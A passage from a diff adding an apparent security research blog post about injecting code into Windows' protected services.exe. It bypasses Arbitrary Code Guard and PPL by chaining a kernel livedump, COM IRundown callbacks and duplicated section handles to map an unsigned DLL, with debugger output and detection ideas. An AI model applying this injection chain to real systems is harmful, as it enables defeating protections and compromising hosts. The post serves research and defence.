+</span></span><span class="line"><span class="cl">    [+0x000 (30:30)] RestrictIndirectBranchPrediction : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (31:31)] IsolateSecurityDomain : 0x0 [Type: unsigned long]
+</span></span></code></pre></div><p><em>Arbitrary Code Guard</em> is enabled on <code>services.exe</code>, which prevents the allocation of a RWX memory section, or changing from RW to RX using our arbitrary call primitive.</p>
+<h3 id="failed-attempt">Failed attempt</h3>
+<p>My first idea to bypass this mitigation, was to abuse a well-known limitation of <em>Arbitrary Code Guard</em>. Although the process itself cannot allocate new executable memory, a different process with a handle to the first process with <code>VM_OPERATION</code> - and without the mitigation - can allocate new executable code within the original process which has <em>Arbitratry Code Guard</em>.</p>
+<p>This is due to the <code>MiArbitraryCodeBlocked</code> function, which is called in the context of the remote process, for instance when calling <code>NtProtectVirtualMemory</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">MiArbitraryCodeBlocked</span><span class="p">(</span><span class="n">_EPROCESS</span> <span class="o">*</span><span class="n">pEprocess</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(((</span><span class="n">pEprocess</span><span class="o">-&gt;</span><span class="n">MitigationFlags</span> <span class="o">&amp;</span> <span class="n">DisableDynamicCode</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">     <span class="p">(</span><span class="nf">KeGetCurrentThread</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">CrossThreadFlags</span> <span class="o">&amp;</span> <span class="n">DisableDynamicCodeOptOut</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(((</span><span class="n">pEprocess</span><span class="o">-&gt;</span><span class="n">MitigationFlags</span> <span class="o">&amp;</span> <span class="n">AuditDisableDynamicCode</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">((</span><span class="nf">KeGetCurrentThread</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">CrossThreadFlags</span> <span class="o">&amp;</span> <span class="n">DisableDynamicCodeOptOut</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">EtwTimLogProhibitDynamicCode</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pEprocess</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">EtwTraceMemoryAcg</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">EtwTraceMemoryAcg</span><span class="p">(</span><span class="mh">0x80000000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">EtwTimLogProhibitDynamicCode</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">pEprocess</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">STATUS_DYNAMIC_CODE_BLOCKED</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Since the <code>EPROCESS</code> passed to this function is the one of the current process in the context of <code>NtAllocateVirtualMemory</code> or <code>NtProtectVirtualMemory</code>, and not the one of the remote process, a process without the mitigation can allocate RWX memory in a process with the mitigation, given a handle with enough right.</p>
+<p>My idea was to call <code>NtDuplicateObject</code> using the arbitrary function call primitive, to give a handle with full permissions to a process without <em>Arbitrary Code Guard</em>, and then perform code injection using this handle.</p>
+<p>However, this doesn&rsquo;t work as I expected: our remote process receives a valid handle to the <code>services.exe</code> process, but this handle only has the <code>Query Limited Informations</code> right.</p>
+<p>The reason for that is that I didn&rsquo;t fully understand how the checks for <em>PPL</em> are implemented.</p>
+<p>The checks are actually implemented by the <code>PsTestProtectedProcessIncompatibility</code> function, called within the <code>PspProcessOpen</code>:</p>
+<p><code>PspProcessOpen</code> is registered as the <code>OpenProcedure</code> for the <code>ObjectType</code> associated with processes objects.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">0: kd&gt; dt nt!_OBJECT_TYPE ffff9a8d`468c1bc0
+</span></span><span class="line"><span class="cl">   +0x000 TypeList         : _LIST_ENTRY [ 0xffff9a8d`468c1bc0 - 0xffff9a8d`468c1bc0 ]
+</span></span><span class="line hl"><span class="cl">   +0x010 Name             : _UNICODE_STRING &#34;Process&#34;
+</span></span><span class="line"><span class="cl">   +0x020 DefaultObject    : (null) 
+</span></span><span class="line"><span class="cl">   +0x028 Index            : 0x7 &#39;&#39;
+</span></span><span class="line"><span class="cl">   +0x02c TotalNumberOfObjects : 0x9b
+</span></span><span class="line"><span class="cl">   +0x030 TotalNumberOfHandles : 0x5e1
+</span></span><span class="line"><span class="cl">   +0x034 HighWaterNumberOfObjects : 0x9b
+</span></span><span class="line"><span class="cl">   +0x038 HighWaterNumberOfHandles : 0x633
+</span></span><span class="line"><span class="cl">   +0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER
+</span></span><span class="line"><span class="cl">   +0x0b8 TypeLock         : _EX_PUSH_LOCK
+</span></span><span class="line"><span class="cl">   +0x0c0 Key              : 0x636f7250
+</span></span><span class="line"><span class="cl">   +0x0c8 CallbackList     : _LIST_ENTRY [ 0xffffaf04`f583ee00 - 0xffffaf04`f583ee00 ]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0: kd&gt; dx -id 0,0,ffff9a8d4bc750c0 -r1 (*((ntkrnlmp!_OBJECT_TYPE_INITIALIZER *)0xffff9a8d468c1c00))
+</span></span><span class="line"><span class="cl">(*((ntkrnlmp!_OBJECT_TYPE_INITIALIZER *)0xffff9a8d468c1c00))                 [Type: _OBJECT_TYPE_INITIALIZER]
+</span></span><span class="line"><span class="cl">    [+0x000] Length           : 0x78 [Type: unsigned short]
+</span></span><span class="line"><span class="cl">    [+0x002] ObjectTypeFlags  : 0xca [Type: unsigned short]
+</span></span><span class="line"><span class="cl">    ...
+</span></span><span class="line"><span class="cl">    [+0x020] RetainAccess     : 0x101000 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x024] PoolType         : NonPagedPoolNx (512) [Type: _POOL_TYPE]
+</span></span><span class="line"><span class="cl">    [+0x028] DefaultPagedPoolCharge : 0x1000 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x02c] DefaultNonPagedPoolCharge : 0xbd8 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x030] DumpProcedure    : 0x0 : 0x0 [Type: void (__cdecl*)(void *,_OBJECT_DUMP_CONTROL *)]
+</span></span><span class="line hl"><span class="cl">    [+0x038] OpenProcedure    : 0xfffff807173e61f0 : ntkrnlmp!PspProcessOpen+0x0 [Type: long (__cdecl*)(_OB_OPEN_REASON,char,_EPROCESS *,void *,unsigned long *,unsigned long)]
+</span></span><span class="line"><span class="cl">    [+0x040] CloseProcedure   : 0xfffff8071732ad50 : ntkrnlmp!PspProcessClose+0x0 [Type: void (__cdecl*)(_EPROCESS *,void *,unsigned __int64,unsigned __int64)]
+</span></span><span class="line"><span class="cl">    [+0x048] DeleteProcedure  : 0xfffff807173df330 : ntkrnlmp!PspProcessDelete+0x0 [Type: void (__cdecl*)(void *)]
+</span></span><span class="line"><span class="cl">    [+0x050] ParseProcedure   : 0x0 : 0x0 [Type: long (__cdecl*)(void *,void *,_ACCESS_STATE *,char,unsigned long,_UNICODE_STRING *,_UNICODE_STRING *,void *,_SECURITY_QUALITY_OF_SERVICE *,void * *)]
+</span></span></code></pre></div><p>As such, when <code>NtDuplicateObject</code> is called, it calls <code>ObDuplicateObject</code>, which, if everything is valid, calls <code>ObpIncrementHandleCountEx</code>, triggering the OpenProcedure for the corresponding Object Type, in our case, <code>PspProcessOpen</code> - which will strip the rights of the handle.</p>
+<p>To solve this issue, a first option is to spawn a new <code>services.exe</code>, but without the mitigation. Afterwards, since <em>Arbitrary Call Guard</em> is not enabled on this new <code>services.exe</code>, it is possible to allocate RWX memory and write a shellcode to it.</p>
+<p>The other option is to abuse the fact that the signature is not verified during the mapping of <code>Section</code> objects.</p>
+<h2 id="the-complete-chain">The complete chain</h2>
+<p>Now, let&rsquo;s see how we can assemble all these primitives to get code execution within <code>services.exe</code>.</p>
+<ul>
+<li>First, we create a Kernel LiveDump, specifying the <code>IncludeUserSpaceMemoryPages</code> flag.</li>
+</ul>
+<p>This will create a livedump on disk. This may slow down the system for a few seconds.</p>
+<ul>
+<li>Next, we parse the livedump to retreive the necessary values</li>
+</ul>
+<p>To be able to parse the livedump file, I made a quick reimplementation of <a href="https://github.com/0vercl0k/kdmp-parser"><code>kdmp-parser</code></a> in Rust (while doing this project, the original author made his own <a href="https://github.com/0vercl0k/kdmp-parser-rs">port to Rust</a>, which is probably much better but I&rsquo;m too lazy to change).</p>
+<p>First, we locate the <code>PsActiveProcessHead</code>, which points to an entry in the doubly-linked of processes in kernel memory containing the <code>EPROCESS</code> structure of all processes. When the target PID is found, we read the <code>DirectoryTableBase</code> field of the <code>EPROCESS</code>, which corresponds to the PML4 entry for the virtual memory of <code>services.exe</code>.</p>
+<ul>
+<li>We also parse the memory of <code>services.exe</code> within the livedump</li>
+</ul>
+<p>To find the COM process secret and context, the easiest way is to use symbols. In their article, MDSec showed how to find the address without symbols, so this can work as well.</p>
+<p>There are two values that we are interested in: the COM context and process secret.</p>
+<ul>
+<li>Within the memory of RPCSS, we locate an <code>IPID</code> and <code>OXID</code> associated with the <code>IRundown</code> interface in the <code>services.exe</code> process</li>
+</ul>
+<p>Since this process does not run as <em>PPL</em>, its memory can be read as a process having <code>SeDebugPrivilege</code> using <code>ReadProcessMemory</code> and similar APIs.</p>
+<p>The symbol <code>gpServerOxidTable</code> within <code>rpcss.dll</code> points to a structure, which contains a number of <code>CServerOXID</code> entries.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">0:000&gt; dp rpcss!gpServerOxidTable
+</span></span><span class="line"><span class="cl">00007ffe`20c5ed08  00000284`dd6412d0 00000284`dd641410
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0:000&gt; dp 00000284`dd6412d0
+</span></span><span class="line"><span class="cl">00000284`dd6412d0  0000011f`00000200 00000284`de1d9750
+</span></span><span class="line"><span class="cl">                      ^        ^             ^
+</span></span><span class="line"><span class="cl">                      |        |             |
+</span></span><span class="line"><span class="cl">                      |        |             |
+</span></span><span class="line"><span class="cl">                      |    Array Max Size    |
+</span></span><span class="line"><span class="cl">                      |                      |
+</span></span><span class="line"><span class="cl">              Current Array Size      Array Address
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0:000&gt; dp 00000284`de1d9750
+</span></span><span class="line"><span class="cl">00000284`de1d9750  00000284`de0ba250 00000284`dddcc250
+</span></span><span class="line"><span class="cl">00000284`de1d9760  00000000`00000000 00000284`de797490
+</span></span><span class="line"><span class="cl">00000284`de1d9770  00000284`de7f89e0 00000284`de058150
+</span></span></code></pre></div><p>Although the <code>CServerOXID</code> structure is undocumented, there are three fields we are interested in: one is the <em>IPID</em> of the <code>IRundown</code> interface, one is the <code>OXID</code> of the object.
+The other is a pointer to the associated <code>CProcess</code> structure, which holds the PID of the process where the object lives.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">0:000&gt; dt nt!_GUID 00000284`de0ba250 + 0x60
+</span></span><span class="line"><span class="cl">ntdll!_GUID
+</span></span><span class="line"><span class="cl"> {0000bc0e-2370-1478-2908-8cd7ff79d45f} &lt;-- IPID of the IRundown interface
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0:000&gt; dp 00000284`de0ba250 + 0x20
+</span></span><span class="line"><span class="cl">00000284`de0ba270  00000284`de7df650 00000012`00000000
+</span></span><span class="line"><span class="cl">                          ^
+</span></span><span class="line"><span class="cl">                          |
+</span></span><span class="line"><span class="cl">                          |
+</span></span><span class="line"><span class="cl">                    CProcess entry
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0:000&gt; du poi(00000284`de7df650 + 0x180)
+</span></span><span class="line"><span class="cl">00000284`de06e740  &#34;C:\Program Files\WindowsApps\Mic&#34;
+</span></span><span class="line"><span class="cl">00000284`de06e780  &#34;rosoft.WindowsTerminal_1.19.1121&#34;
+</span></span><span class="line"><span class="cl">00000284`de06e7c0  &#34;3.0_x64__8wekyb3d8bbwe\WindowsTe&#34;
+</span></span><span class="line"><span class="cl">00000284`de06e800  &#34;rminal.exe&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0:000&gt; dd 00000284`de7df650+0x58
+</span></span><span class="line"><span class="cl">00000284`de7df6a8  00002370 &lt;-- PID of the process, here WindowsTerminal.exe
+</span></span></code></pre></div><ul>
+<li>Finally, we use the <code>IRundown::DoCallback</code> method repeatedly, to invoke <code>combase!CStdStubBuffer_AddRef</code>.</li>
+</ul>
+<p>Using the arbitrary increment, we craft valid <code>RPC_MESSAGE</code>s for the next function calls, with valid arguments.</p>
+<p>If the target <code>services.exe</code> is a new process without <em>Arbitrary Code Guard</em>, the chain of <code>RPC_MESSAGE</code> can be used to allocate a RWX buffer, copy a shellcode and execute it.</p>
+<p>Otherwise, if the <code>services.exe</code> is the original one, the payload must be mapped via <code>NtMapViewOfSection</code> in the process.
+The easiest way would be to change the protection of <code>ntdll!LdrpKnownDllDirectoryHandle</code>, write a valid handle to a <code>Directory object</code> containing section ojects, then call <code>LoadLibraryA</code>. However, I decided it would be interesting to explore how to do it without leveraging <code>ntdll!LdrpKnownDllDirectoryHandle</code>.</p>
+<p>In the exploit process, we call <code>NtCreateSection</code> on an unsigned DLL. Then, using the ability to call functions within <code>services.exe</code>, open the exploit process using <code>NtOpenProcess</code>, and duplicate the section handle of the unsigned DLL using <code>NtDuplicateObject</code>. With this, we have a valid handle to a <code>Section</code> object inside <code>services.exe</code>, without having performed the signature verification. This <code>Section</code> object can then be mapped with <code>NtMapViewOfSection</code>. The downside of this approach is although the DLL is mapped, relocations are not fixed, as they are usually done in the call to <code>LdrLoadDll</code> and not in the <code>NtMapViewOfSection</code> syscall.</p>
+<p>I have implemented a proof of concept for this strategy, available <a href="https://github.com/Slowerzs/ThievingFox/PPLSystem">on Github</a>.</p>
+<h2 id="detections-ideas-and-takeaways">Detections ideas and takeaways</h2>
+<p>Regarding detection, the <code>Kernel-LiveDump</code> log source generates events when such a dump is created, in particular, event IDs 2, 3, and 4 seem relevant.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">PS&gt; Get-WinEvent -LogName Microsoft-Windows-Kernel-LiveDump/Operational -MaxEvents 3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ProviderName: Microsoft-Windows-Kernel-LiveDump
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TimeCreated                      Id LevelDisplayName Message
+</span></span><span class="line"><span class="cl">-----------                      -- ---------------- -------
+</span></span><span class="line"><span class="cl">5/16/2024 10:17:16 PM             2 Information      Live Dump Capture Dump Data API ended. NT Status: STATUS_SUCCESS.  BugcheckCode: 353. BugcheckParameter1: 0x5461736b6d6772...
+</span></span><span class="line"><span class="cl">5/16/2024 10:17:16 PM             4 Information      Writing dump file ended. NT Status: 0x0. Total 5279019040 bytes (Header|Primary|Secondary: 1802240|5277200384|16416 bytes)...
+</span></span><span class="line"><span class="cl">5/16/2024 10:17:14 PM             3 Information      Writing dump file started.
+</span></span></code></pre></div><p>This might also help detect the <a href="https://github.com/y00ga-sec/Forensike">misuse</a> of legitimate RAM acquisition tools for offensive purposes, though I haven&rsquo;t investigated whether these drivers leverage the same kernel API or perform the dump without it.</p>
+<p>In combination, <em>Arbitrary Code Guard</em> and <em>PPL</em> should work well together to prevent code injection, somewhat similarily to <a href="https://connormcgarr.github.io/hvci/"><em>HVCI</em></a>, but due to the limitations of each, they fall short of the goal. In particular, the absence of verification during the mapping is a design flaw that has remained unfixed since the first report about it.
+It be interesting to require <em>PPL</em> processes to be started with <em>Arbitrary Code Guard</em> enabled, but this might have side effects I haven&rsquo;t considered.</p>
+<p>Finally, this method could be leveraged to inject into <em>Protected Process</em> as well, but there seems to be little reason to do so as far as I know.</p>
+
+
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+
+
+    
+
+    
+
+    <div id="modal" class="modal">
+        <img id="modal-content" class="modal-content">
+    </div>
+    <script>
+
+        if (typeof screen.orientation !== 'undefined') {
+            
+            var modal = document.getElementById('modal');
+
+            modal.addEventListener('click', function (e) {
+                if (e.target === e.currentTarget) {
+                    modal.style.display = "none";
+                    document.body.style.overflowY = "visible"
+                }
+            });
+            document.addEventListener('keydown', function (e) {
+                if (e.key === "Escape") {
+                    modal.style.display = "none";
+                    document.body.style.overflowY = "visible"
+                }
+            })
+
+            document.addEventListener('click', function (e) {
+                if (e.target.parentElement.parentElement.className.indexOf('figure') !== -1) {
+                    var img = e.target;
+                    var modalImg = document.getElementById("modal-content");
+                    document.body.style.overflowY = "hidden"
+                    modal.style.display = "flex";
+                    modalImg.src = img.src;
+                }
+            });
+
+        }
+
+
+    </script>
+
+    
+
+</body>
+
+</html>
